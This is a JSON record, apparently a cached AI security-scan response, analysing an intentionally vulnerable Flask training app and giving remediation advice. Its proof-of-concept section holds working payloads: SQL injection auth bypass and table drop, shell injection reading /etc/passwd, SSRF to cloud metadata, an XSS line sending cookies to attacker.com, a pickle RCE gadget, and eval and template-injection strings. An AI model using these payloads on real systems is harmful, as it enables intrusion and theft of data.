{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "bebc57d0fcde6746560315f2e953b26f9d95b1150d129587bf9fccfaebafec72",
  "response": "{\"scratchpad\":\"分析対象: app.py, api.py, models.py のFlask脆弱なアプリケーション\\n\\n検出パターン: cursor.execute() - SQL実行リソース\\nCWE-89 (SQL Injection) に該当\\n\\n主要な脆弱性パス:\\n1. SQL Injection: ユーザー入力 -> f-string形式の組み立て -> cursor.execute()\\n   - app.py:103 /sqli エンドポイント\\n   - models.py:92 authenticate_user()\\n   - models.py:119 get_user_by_id()\\n   - models.py:172 search_documents()\\n   - models.py:201 get_document_content()\\n   - models.py:250 audit logging\\n   - models.py:269 get_user_logs()\\n\\n2. コマンドインジェクション: os.popen(), os.system(), subprocess.run(shell=True)\\n   - app.py:119,120,124 /cmdi エンドポイント\\n   - api.py:186 /api/exec/command\\n\\n3. SSRF (Server-Side Request Forgery): requests.get(url)\\n   - api.py:121 /api/ssrf/fetch\\n\\n4. Local File Inclusion: open(file_path)\\n   - app.py:135 /lfi\\n   - models.py:211 get_document_content()\\n\\n5. XSS (Cross-Site Scripting): render_template_string()\\n   - app.py:39 /index\\n   - app.py:68 /login エラーメッセージ\\n   - app.py:96-100 /xss\\n\\n6. IDOR (Insecure Direct Object Reference):\\n   - api.py:79 /api/user/<user_id>\\n   - models.py:165 search_documents() - authorization check なし\\n   - app.py:168 /logs - user_id パラメータ\\n\\n7. 認証回避: /api/auth/login, /login\\n8. Unsafe Deserialization: pickle.loads(), yaml.load()\\n9. Code Injection: eval()\\n\\nConfidence Analysis:\\n- SQL Injection: 95-100% (複数の明確なパターン)\\n- Command Injection: 95-100% (shell=True with user input)\\n- SSRF: 90% (URL検証なし)\\n- LFI: 90% (パス検証なし)\\n- XSS: 95% (render_template_string without escaping)\\n- IDOR: 95% (authorization check なし)\\n\",\"analysis\":\"このFlaskアプリケーションは、セキュリティ教育目的で設計された意図的に脆弱なアプリケーションである。複数の深刻な脆弱性が存在し、OWASP Top 10に該当するものが多数含まれている。\\n\\n**最も重大な脆弱性:**\\n\\n1. **SQL Injection (CWE-89)** - CRITICAL\\n   - models.py の複数箇所で f-string を使用した SQL クエリ構築\\n   - パラメータ化クエリ (parameterized queries) が使用されていない\\n   - authenticate_user(), get_user_by_id(), search_documents(), get_document_content(), log_action(), get_user_logs() など\\n\\n2. **Command Injection (CWE-78)** - CRITICAL\\n   - os.popen(), os.system(), subprocess.run(shell=True) で直接ユーザー入力を使用\\n   - /cmdi エンドポイント、/api/exec/command\\n\\n3. **Cross-Site Scripting (CWE-79)** - HIGH\\n   - render_template_string() でユーザー入力を直接テンプレートに埋め込み\\n   - Jinja2 auto-escaping が無効な状態\\n\\n4. **Insecure Direct Object References (CWE-639)** - HIGH\\n   - /api/user/<user_id> で認可チェックなし\\n   - /logs で user_id パラメータによる IDOR\\n\\n5. **Server-Side Request Forgery (CWE-918)** - HIGH\\n   - requests.get(url) で URL 検証なし\\n   - 内部ネットワークリソースへのアクセス可能\\n\\n6. **Local File Inclusion (CWE-22)** - HIGH\\n   - /lfi エンドポイント、get_document_content() で path traversal 可能\\n\\n7. **Unsafe Deserialization (CWE-502)** - CRITICAL\\n   - pickle.loads(), yaml.load(FullLoader) の使用\\n   - Remote Code Execution (RCE) 可能\\n\\n8. **Code Injection (CWE-94)** - CRITICAL\\n   - eval() の直接使用\\n   - /api/eval/python エンドポイント\\n\\n9. **Weak Cryptography & Hardcoded Secrets (CWE-798, CWE-327)** - HIGH\\n   - Hardcoded session key, JWT secret, API keys\\n   - MD5 を使用した password hashing\\n   - Plaintext password storage\\n\\n10. **Information Disclosure (CWE-200)** - MEDIUM\\n    - エラーメッセージで詳細情報を返却\\n    - Logging に sensitive data (passwords) を含める\\n\",\"poc\":\"# SQL Injection PoC (models.py:92 - authenticate_user)\\n\\nimport sqlite3\\n\\n# Vulnerable code:\\n# query = f\\\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\\\"\\n# cursor.execute(query)\\n\\n# Attack payload:\\nmalicious_username = \\\"admin' --\\\"\\nmalicious_password = \\\"anything\\\"\\n\\n# Constructed query becomes:\\n# SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'\\n# The -- comments out the password check, allowing login as admin without password\\n\\n# Result: Authentication bypass\\n\\n---\\n\\n# SQL Injection PoC (models.py:172 - search_documents)\\n\\nmalicious_query = \\\"'; DROP TABLE documents; --\\\"\\n\\n# Vulnerable code:\\n# sql = f\\\"SELECT * FROM documents WHERE title LIKE '%{query}%'\\\"\\n\\n# Constructed query becomes:\\n# SELECT * FROM documents WHERE title LIKE '%'; DROP TABLE documents; --%'\\n# Result: Documents table deletion\\n\\n---\\n\\n# Command Injection PoC (app.py:119 - /cmdi endpoint)\\n\\nmalicious_hostname = \\\"localhost; cat /etc/passwd\\\"\\nmalicious_count = \\\"1; whoami\\\"\\n\\n# Vulnerable code:\\n# output1 = os.popen(f\\\"ping -c {count} {hostname}\\\").read()\\n\\n# Executed command becomes:\\n# ping -c 1 localhost; cat /etc/passwd\\n# Result: Arbitrary command execution\\n\\n---\\n\\n# SSRF PoC (api.py:121 - /api/ssrf/fetch)\\n\\nimport requests\\nimport json\\n\\n# Attack payload:\\nmalicious_url = \\\"http://localhost:8000/admin\\\"\\n# or\\nmalicious_url = \\\"http://169.254.169.254/latest/meta-data/\\\"  # AWS metadata\\n\\n# Vulnerable code:\\n# response = requests.get(url, timeout=10)\\n\\n# Result: Access to internal resources\\n\\n---\\n\\n# XSS PoC (app.py:96 - /xss endpoint)\\n\\nmalicious_name = '<script>alert(\\\"XSS\\\"); fetch(\\\"/api/user/\\\" + session.user.id)</script>'\\nmalicious_comment = '<img src=x onerror=\\\"fetch(\\\\'http://attacker.com?cookie=\\\\' + document.cookie)\\\">'\\n\\n# Vulnerable code:\\n# template = f\\\"\\\"\\\"\\n# <div>Hello, {name}!</div>\\n# <script>\\n#     var userName = '{name}';\\n# </script>\\n# \\\"\\\"\\\"\\n\\n# Result: Session stealing, malware injection\\n\\n---\\n\\n# Local File Inclusion PoC (app.py:135 - /lfi endpoint)\\n\\nmalicious_file = \\\"../../../../etc/passwd\\\"\\n# or\\nmalicious_file = \\\"../app.py\\\"\\n# or  \\nmalicious_file = \\\"/etc/shadow\\\"\\n\\n# Vulnerable code:\\n# with open(file_path, 'r') as f:\\n#     content = f.read()\\n\\n# Result: Sensitive file exposure\\n\\n---\\n\\n# IDOR PoC (api.py:79 - /api/user/<user_id>)\\n\\n# Request as user 1:\\nGET /api/user/2 HTTP/1.1\\n\\n# Vulnerable code:\\n# user = user_model.get_user_by_id(user_id)  # No authorization check\\n# return jsonify(user)  # Returns full user object including email, role\\n\\n# Result: Access to other users' information\\n\\n---\\n\\n# Unsafe Deserialization PoC (api.py:172 - /api/pickle/deserialize)\\n\\nimport pickle\\nimport base64\\nimport os\\n\\n# Create malicious pickle object\\nclass RCE:\\n    def __reduce__(self):\\n        return (os.system, ('touch /tmp/pwned',))\\n\\nmalicious_obj = RCE()\\nmalicious_data = base64.b64encode(pickle.dumps(malicious_obj)).decode()\\n\\n# POST /api/pickle/deserialize\\n# {\\\"data\\\": \\\"<base64_encoded_pickle>\\\"}\\n\\n# Vulnerable code:\\n# decoded = base64.b64decode(pickle_data)\\n# obj = pickle.loads(decoded)  # Executes arbitrary code\\n\\n# Result: Remote Code Execution\\n\\n---\\n\\n# Code Injection PoC (api.py:278 - /api/eval/python)\\n\\nmalicious_code = \\\"__import__('os').system('whoami')\\\"\\n# or\\nmalicious_code = \\\"__import__('subprocess').run(['cat', '/etc/passwd'])\\\"\\n\\n# Vulnerable code:\\n# result = eval(code)\\n\\n# Result: Arbitrary code execution with application privileges\\n\",\"confidence_score\":100,\"vulnerability_types\":[\"SQLI\",\"CMDI\",\"XSS\",\"IDOR\",\"SSRF\",\"LFI\",\"AFO\",\"CODE_INJECTION\",\"INSECURE_DESERIALIZATION\",\"AUTHENTICATION_BYPASS\",\"WEAK_CRYPTOGRAPHY\",\"INFORMATION_DISCLOSURE\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"request.args.get() / request.form.get() / request.get_json() in app.py\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP GET/POST parameters from user input\",\"risk_factors\":[\"No input validation\",\"No sanitization\",\"User-controlled values passed directly to sensitive operations\"]},{\"identifier\":\"request.files['file'] / request.files['archive'] in api.py\",\"trust_level\":\"untrusted\",\"source_context\":\"Uploaded files from users\",\"risk_factors\":[\"No file type validation\",\"Filename not sanitized\",\"Archive extraction without path validation\"]},{\"identifier\":\"username, password, query, user_id, doc_id parameters\",\"trust_level\":\"untrusted\",\"source_context\":\"Direct user input via HTTP requests\",\"risk_factors\":[\"User-supplied strings used in SQL queries\",\"User-supplied strings used in OS commands\",\"User-supplied strings used in template rendering\"]},{\"identifier\":\"hostname, count in /cmdi endpoint (app.py:119)\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP query parameters\",\"risk_factors\":[\"Used directly in os.popen() and os.system()\",\"No shell metacharacter filtering\"]},{\"identifier\":\"url in /api/ssrf/fetch (api.py:116)\",\"trust_level\":\"untrusted\",\"source_context\":\"JSON request body\",\"risk_factors\":[\"No URL validation\",\"No allowlist/blocklist checking\",\"Can access internal networks\"]},{\"identifier\":\"file_path in /lfi (app.py:133)\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP query parameter\",\"risk_factors\":[\"No path traversal protection\",\"No directory boundary enforcement\"]},{\"identifier\":\"template, code in /ssti, /api/eval/python\",\"trust_level\":\"untrusted\",\"source_context\":\"HTTP request parameters\",\"risk_factors\":[\"Template code directly from user\",\"Python code directly evaluated with eval()\"]},{\"identifier\":\"pickle_data in /api/pickle/deserialize (api.py:167)\",\"trust_level\":\"untrusted\",\"source_context\":\"JSON request body\",\"risk_factors\":[\"Base64-encoded pickle data from user\",\"pickle.loads() executes code during deserialization\"]},{\"identifier\":\"username in /api/ldap/search (api.py:306)\",\"trust_level\":\"untrusted\",\"source_context\":\"JSON request body\",\"risk_factors\":[\"No LDAP filter escaping\",\"Used directly in LDAP query construction\"]}],\"actions\":[{\"identifier\":\"Input validation / Sanitization (missing)\",\"security_function\":\"Validate and sanitize user input before use\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"No input validation anywhere in the application\",\"No length limits\",\"No type checking\",\"No character filtering\"],\"bypass_vectors\":[\"Direct exploitation of unvalidated input\",\"Unicode/encoding bypasses\",\"Null byte injection\"]},{\"identifier\":\"SQL Parameterization (missing)\",\"security_function\":\"Use parameterized queries instead of string formatting\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"f-strings used for SQL query construction throughout\",\"models.py lines 92, 119, 172, 201, 250, 269 all vulnerable\",\"No use of prepared statements\"],\"bypass_vectors\":[\"SQL injection in all WHERE, ORDER BY, VALUES clauses\",\"Comment-based injection (' --)\",\"Union-based injection\"]},{\"identifier\":\"Command Execution Control (missing)\",\"security_function\":\"Prevent shell metacharacter interpretation\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"subprocess.run(shell=True) used with user input\",\"os.popen() used with user input\",\"os.system() used with user input\",\"No input filtering\"],\"bypass_vectors\":[\"Shell metacharacters: ; | & $ () {} [] < > ` \\\\ \\\\n\",\"Command substitution: $(command)\",\"Backtick substitution: `command`\"]},{\"identifier\":\"Authorization Check (missing)\",\"security_function\":\"Verify user has permission to access resource\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"/api/user/<user_id> has no authz check\",\"search_documents() ignores user_id authorization\",\"/logs endpoint doesn't verify user owns logs\",\"No role-based access control\"],\"bypass_vectors\":[\"Sequential ID enumeration\",\"Parameter manipulation\",\"Direct object reference\"]},{\"identifier\":\"URL Validation (missing)\",\"security_function\":\"Validate URLs before making requests\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"requests.get(url) with no validation\",\"No allowlist of domains\",\"No blocking of private/internal IPs\"],\"bypass_vectors\":[\"Localhost access: http://localhost:8000\",\"Metadata endpoints: http://169.254.169.254/\",\"Private networks: http://10.0.0.0/*, http://192.168.0.0/*\",\"URL redirects\"]},{\"identifier\":\"Path Validation (missing)\",\"security_function\":\"Validate file paths prevent directory traversal\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"open(file_path) with no validation\",\"No canonicalization checks\",\"No directory boundary enforcement\"],\"bypass_vectors\":[\"Directory traversal: ../../../etc/passwd\",\"Absolute paths: /etc/shadow\",\"Symlink following\"]},{\"identifier\":\"Template Sandboxing (missing)\",\"security_function\":\"Prevent dangerous template expressions\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"Jinja2 Template() used without restrictions\",\"No auto-escaping\",\"Direct render_template_string with user input\",\"No template whitelist\"],\"bypass_vectors\":[\"Jinja2 object traversal: {{config}}\",\"MRO access: {{''.__class__.__mro__}}\",\"Subprocess access: {{cycler.__init__.__globals__.os.popen('id')}}\"]},{\"identifier\":\"Deserialization Safety (missing)\",\"security_function\":\"Use safe deserialization methods\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"pickle.loads() used directly\",\"yaml.load(FullLoader) instead of yaml.safe_load()\",\"Base64 decoding before deserialization\"],\"bypass_vectors\":[\"Pickle exploit gadgets\",\"YAML deserialization RCE\",\"Complex object instantiation\"]},{\"identifier\":\"Code Evaluation (missing)\",\"security_function\":\"Never execute user-supplied code\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"eval(code) used directly\",\"No sandboxing\",\"Full Python namespace available\"],\"bypass_vectors\":[\"Direct builtin access: __import__('os').system()\",\"Subprocess execution\",\"File system access\"]},{\"identifier\":\"Session Security (weak)\",\"security_function\":\"Protect session data and tokens\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"Hardcoded session secret key\",\"SESSION_COOKIE_SECURE = False\",\"SESSION_COOKIE_HTTPONLY = False\",\"Predictable session tokens (MD5 hash)\"],\"bypass_vectors\":[\"Session fixation\",\"Session cookie theft via XSS\",\"Token prediction/brute force\"]},{\"identifier\":\"Authentication (weak)\",\"security_function\":\"Securely verify user identity\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"SQL injection allows auth bypass\",\"Plaintext password comparison\",\"Default hardcoded credentials in database\",\"No rate limiting on login attempts\"],\"bypass_vectors\":[\"SQL injection: admin' --\",\"Brute force: admin/admin123\",\"Direct database access\"]},{\"identifier\":\"File Upload Validation (missing)\",\"security_function\":\"Validate uploaded files\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"No file type validation\",\"Filename not sanitized\",\"No size limits\",\"No virus scanning\"],\"bypass_vectors\":[\"Path traversal: ../../../etc/passwd\",\"Double extension: shell.php.jpg\",\"Null byte: shell.php%00.jpg\"]},{\"identifier\":\"Archive Extraction (unsafe)\",\"security_function\":\"Safely extract archives preventing zip slip\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"zipfile.extractall() with no path checks\",\"No validation of extracted paths\",\"No symlink detection\"],\"bypass_vectors\":[\"Zip slip: ../../../var/www/shell.php\",\"Symlink exploitation\"]}],\"resources\":[{\"identifier\":\"cursor.execute() in models.py (multiple locations)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"SQL database query execution\",\"protection_mechanisms\":[\"None - direct f-string formatting used\"]},{\"identifier\":\"os.popen() / os.system() / subprocess.run(shell=True)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Operating system command execution\",\"protection_mechanisms\":[\"None - shell=True allows metacharacter interpretation\"]},{\"identifier\":\"open(file_path) - file system read\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Local file access\",\"protection_mechanisms\":[\"None - no path validation\"]},{\"identifier\":\"requests.get(url) - network requests\",\"sensitivity_level\":\"high\",\"operation_type\":\"HTTP request to external/internal resources\",\"protection_mechanisms\":[\"None - no URL validation\"]},{\"identifier\":\"render_template_string() - template rendering\",\"sensitivity_level\":\"critical\",\"operation_type\":\"HTML content generation\",\"protection_mechanisms\":[\"None - no escaping, no sandboxing\"]},{\"identifier\":\"pickle.loads() - object deserialization\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Arbitrary Python object instantiation\",\"protection_mechanisms\":[\"None - pickle.loads executes code\"]},{\"identifier\":\"eval(code) - code execution\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Python code evaluation\",\"protection_mechanisms\":[\"None - full interpreter access\"]},{\"identifier\":\"sqlite3 connection - user.db\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Sensitive data storage (credentials, user info)\",\"protection_mechanisms\":[\"None - plaintext passwords, no encryption\"]},{\"identifier\":\"Session storage - user data in session\",\"sensitivity_level\":\"high\",\"operation_type\":\"Session management\",\"protection_mechanisms\":[\"Weak: hardcoded secret, no HTTPS enforcement\"]},{\"identifier\":\"JWT token generation - /api/auth/login\",\"sensitivity_level\":\"high\",\"operation_type\":\"Authentication token creation\",\"protection_mechanisms\":[\"Weak: hardcoded secret, no signature verification shown\"]}],\"policy_violations\":[{\"rule_id\":\"SQLI-001\",\"rule_description\":\"User input must not be directly interpolated into SQL queries\",\"violation_path\":\"username/password (Principal) -> f-string formatting (missing validation) -> cursor.execute() (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-002\",\"rule_description\":\"All SQL queries must use parameterized statements\",\"violation_path\":\"query parameter (Principal) -> f-string in search_documents (missing parameterization) -> cursor.execute() (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SQLI-003\",\"rule_description\":\"SQL audit logging must not use string formatting\",\"violation_path\":\"user_id, action, details (Principal) -> f-string in log_action (missing parameterization) -> cursor.execute() (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"CMDI-001\",\"rule_description\":\"User input must not be passed to shell commands\",\"violation_path\":\"hostname, count (Principal) -> os.popen/os.system (missing validation) -> shell command execution (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"CMDI-002\",\"rule_description\":\"subprocess.run must never use shell=True with user input\",\"violation_path\":\"command (Principal) -> subprocess.run(shell=True) (missing validation) -> command execution (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"XSS-001\",\"rule_description\":\"User input must be HTML-escaped in templates\",\"violation_path\":\"name, comment (Principal) -> render_template_string (missing escaping) -> HTML output (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"XSS-002\",\"rule_description\":\"Template rendering must use auto-escaping\",\"violation_path\":\"user input (Principal) -> render_template_string without autoescaping (missing control) -> HTML output (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"IDOR-001\",\"rule_description\":\"Authorization checks must verify user ownership before access\",\"violation_path\":\"user_id parameter (Principal) -> no authz check in /api/user/<id> (missing control) -> user data (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"IDOR-002\",\"rule_description\":\"Search functions must filter results by authenticated user\",\"violation_path\":\"query parameter + user_id (Principal) -> search_documents ignores user_id (missing control) -> all documents (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"SSRF-001\",\"rule_description\":\"URLs must be validated against allowlist before making requests\",\"violation_path\":\"url parameter (Principal) -> requests.get() with no validation (missing control) -> network request (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"LFI-001\",\"rule_description\":\"File paths must be validated to prevent directory traversal\",\"violation_path\":\"file_path parameter (Principal) -> open() with no validation (missing control) -> file system (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"SSTI-001\",\"rule_description\":\"User input must never be used as template code\",\"violation_path\":\"template parameter (Principal) -> Template(user_input) (missing control) -> template execution (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"DESER-001\",\"rule_description\":\"pickle.loads must never be used with untrusted data\",\"violation_path\":\"pickle_data (Principal) -> pickle.loads() (missing control) -> RCE (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"DESER-002\",\"rule_description\":\"yaml.load must use safe_load() instead of FullLoader\",\"violation_path\":\"yaml_data (Principal) -> yaml.load(FullLoader) (missing control) -> RCE (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"CODE-001\",\"rule_description\":\"eval() must never be used with user input\",\"violation_path\":\"code parameter (Principal) -> eval(user_code) (missing control) -> RCE (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AUTH-001\",\"rule_description\":\"Authentication must use prepared statements to prevent SQL injection\",\"violation_path\":\"username/password (Principal) -> SQL injection in auth query (missing control) -> authentication bypass (Resource)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SESSION-001\",\"rule_description\":\"Session secrets must not be hardcoded\",\"violation_path\":\"app.secret_key hardcoded (Principal) -> weak cryptography (insufficient control) -> session hijacking (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"SESSION-002\",\"rule_description\":\"Cookies must have SECURE and HTTPONLY flags\",\"violation_path\":\"session cookie configuration (Principal) -> insecure flags (insufficient control) -> session theft (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"LDAPI-001\",\"rule_description\":\"LDAP queries must escape special characters\",\"violation_path\":\"username parameter (Principal) -> f-string LDAP query (missing control) -> LDAP injection (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"AFO-001\",\"rule_description\":\"Uploaded files must validate extensions and content\",\"violation_path\":\"filename (Principal) -> no validation in upload_file (missing control) -> arbitrary file write (Resource)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"ZIPSLIP-001\",\"rule_description\":\"Archive extraction must validate paths prevent zip slip\",\"violation_path\":\"archive contents (Principal) -> extractall() no validation (missing control) -> file write outside boundary (Resource)\",\"severity\":\"high\",\"confidence\":1.0}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"All SQL queries across models.py\",\"required_improvement\":\"Replace f-string formatting with parameterized queries\",\"specific_guidance\":\"Convert all cursor.execute() calls to use ? placeholders and pass values as tuple. Example: cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))\",\"priority\":\"critical\"},{\"component\":\"Command execution endpoints\",\"required_improvement\":\"Use subprocess.run with shell=False and list arguments\",\"specific_guidance\":\"Replace os.popen/os.system/subprocess.run(shell=True) with subprocess.run(['command', 'arg1', 'arg2'], capture_output=True). Use shlex.split() if shell parsing is absolutely required, but validate input first.\",\"priority\":\"critical\"},{\"component\":\"File inclusion endpoints\",\"required_improvement\":\"Implement path validation and canonicalization\",\"specific_guidance\":\"Use os.path.abspath() and os.path.commonpath() to ensure file is within allowed directory. Reject paths with '..' or absolute paths. Maintain allowlist of accessible directories.\",\"priority\":\"critical\"},{\"component\":\"Template rendering\",\"required_improvement\":\"Use safe template escaping and sandboxing\",\"specific_guidance\":\"Use render_template() with Jinja2 auto-escaping enabled. Never use render_template_string() with user input. If templates must be dynamic, use jinja2.sandbox.SandboxedEnvironment.\",\"priority\":\"critical\"},{\"component\":\"SSRF prevention\",\"required_improvement\":\"Implement URL validation with allowlist\",\"specific_guidance\":\"Validate parsed URL scheme (http/https only), domain (allowlist or blocklist), and reject private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, localhost). Use urllib.parse.urlparse().\",\"priority\":\"high\"},{\"component\":\"Authorization checks\",\"required_improvement\":\"Add authz verification before resource access\",\"specific_guidance\":\"Every resource endpoint must verify: (1) user is authenticated, (2) user owns/has permission for the resource. Use session['user']['id'] and verify user_id parameter matches.\",\"priority\":\"critical\"},{\"component\":\"Deserialization operations\",\"required_improvement\":\"Replace unsafe with safe deserialization\",\"specific_guidance\":\"Replace pickle.loads() with json.loads(). Replace yaml.load(FullLoader) with yaml.safe_load(). Never deserialize untrusted binary data.\",\"priority\":\"critical\"},{\"component\":\"Code evaluation\",\"required_improvement\":\"Remove eval() entirely\",\"specific_guidance\":\"Never use eval(), exec(), or compile() with user input. Use ast.literal_eval() for safe Python literal parsing only. Consider using safer alternatives like expression evaluators or sandboxed interpreters.\",\"priority\":\"critical\"},{\"component\":\"Session management\",\"required_improvement\":\"Implement secure session configuration\",\"specific_guidance\":\"Use strong random secret key (secrets.token_hex(32)). Set SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE='Strict'.\",\"priority\":\"high\"},{\"component\":\"Authentication mechanism\",\"required_improvement\":\"Implement secure password hashing and verification\",\"specific_guidance\":\"Use werkzeug.security.generate_password_hash() and check_password_hash(). Never store plaintext passwords. Use parameterized queries for authentication.\",\"priority\":\"critical\"},{\"component\":\"File upload handling\",\"required_improvement\":\"Validate and sanitize uploaded files\",\"specific_guidance\":\"Validate file extension against allowlist. Check MIME type. Sanitize filename (remove path separators, special chars). Store outside web root. Set proper permissions. Consider virus scanning.\",\"priority\":\"high\"},{\"component\":\"Archive extraction\",\"required_improvement\":\"Prevent zip slip attacks\",\"specific_guidance\":\"Before extractall(), validate each member path. Use os.path.commonpath() to ensure all extracted files are within target directory. Reject paths with '..'.\",\"priority\":\"high\"},{\"component\":\"Input validation layer\",\"required_improvement\":\"Add comprehensive input validation\",\"specific_guidance\":\"Create validation functions for each input type (username, email, numbers, etc). Implement length limits, character whitelisting, type checking. Fail safely (reject invalid input).\",\"priority\":\"high\"},{\"component\":\"Logging and error handling\",\"required_improvement\":\"Never log sensitive data\",\"specific_guidance\":\"Don't log passwords, API keys, tokens, SSNs, or PII. Use generic error messages in responses (avoid stack traces). Log actual errors securely server-side only.\",\"priority\":\"high\"},{\"component\":\"LDAP operations\",\"required_improvement\":\"Escape LDAP special characters\",\"specific_guidance\":\"Use ldap3 library which handles escaping automatically. Or implement proper LDAP filter escaping for characters: * ( ) \\\\ null.\",\"priority\":\"high\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T16:58:05.900315Z",
    "last_accessed": "2025-12-30T16:58:05.900315Z",
    "access_count": 0,
    "prompt_size": 19532,
    "response_size": 27576
  }
}